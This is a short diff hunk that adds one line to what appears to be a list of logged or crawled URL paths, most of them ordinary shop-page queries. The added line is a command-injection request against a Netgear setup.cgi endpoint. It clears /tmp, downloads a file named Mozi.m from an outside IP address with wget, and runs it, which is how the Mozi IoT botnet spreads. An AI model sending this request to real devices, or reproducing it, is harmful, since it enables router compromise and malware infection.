@@ -25094,3 +25094,4 @@ http://64.233.170.113/
 /figs-loso-gold-figs-30-50-cm?order=DESC&page=21&sort=rating&tag=-
 /figs-loso-gold-figs-30-50-cm?order=DESC&page=26&sort=rating&tag
 /?srsltid=AfmBOoqJ34oKlNHjA_9RIpSyzXWLE19qjrkWd6on8RqR_jD_9W_gfBUN
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.94.100.251:49097/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
